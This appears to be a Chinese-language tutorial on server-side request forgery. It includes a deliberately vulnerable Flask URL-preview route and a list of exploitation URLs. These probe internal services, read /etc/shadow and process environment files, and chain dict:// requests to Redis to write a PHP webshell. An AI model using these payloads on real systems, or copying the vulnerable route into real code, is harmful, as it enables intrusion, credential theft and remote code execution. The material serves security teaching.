SSRF服务器端请求伪造攻击

攻击原理

SSRF（Server-Side Request Forgery，服务器端请求伪造）是指攻击者利用服务器端发起请求的功能， 让服务器访问攻击者指定的URL，从而实现对内网服务的探测、攻击或读取服务器本地文件。

SSRF攻击条件

  • 服务器提供URL获取/预览功能
  • 未对目标URL进行充分验证和过滤
  • 服务器可以访问内网资源
  • 支持file://、dict://、gopher://等协议

SSRF危害

  • 探测内网服务（Redis、Memcached、数据库等）
  • 读取服务器本地文件（/etc/passwd、配置文件等）
  • 攻击内网其他服务（未授权访问）
  • 端口扫描内网主机
  • 配合Redis等服务实现远程代码执行

漏洞代码示例

# 危险的URL预览功能 - 存在SSRF漏洞
@app.route('/preview')
def preview_url():
    url = request.args.get('url')

    # 危险：直接使用用户提供的URL发起请求
    # 没有验证URL是否为内网地址
    # 没有限制可访问的协议
    response = requests.get(url)

    return response.text

# 攻击者可以构造以下请求：
# /preview?url=http://127.0.0.1:6379/     -> 访问内网Redis
# /preview?url=file:///etc/passwd          -> 读取本地文件
# /preview?url=http://192.168.1.1/admin    -> 访问内网管理界面

SSRF利用方式

# 1. 探测内网服务
http://target.com/fetch?url=http://127.0.0.1:6379    # Redis
http://target.com/fetch?url=http://127.0.0.1:3306    # MySQL
http://target.com/fetch?url=http://127.0.0.1:27017   # MongoDB
http://target.com/fetch?url=http://192.168.1.1:8080  # 内网Web

# 2. 读取本地文件
http://target.com/fetch?url=file:///etc/passwd
http://target.com/fetch?url=file:///etc/shadow
http://target.com/fetch?url=file:///proc/self/environ

# 3. 端口扫描
http://target.com/fetch?url=http://127.0.0.1:80
http://target.com/fetch?url=http://127.0.0.1:443
http://target.com/fetch?url=http://127.0.0.1:8080

# 4. 配合Redis实现RCE
http://target.com/fetch?url=dict://127.0.0.1:6379/config:set:dir:/var/www/html
http://target.com/fetch?url=dict://127.0.0.1:6379/config:set:dbfilename:shell.php
http://target.com/fetch?url=dict://127.0.0.1:6379/set:webshell:<?php system($_GET[cmd]);?>
http://target.com/fetch?url=dict://127.0.0.1:6379/save
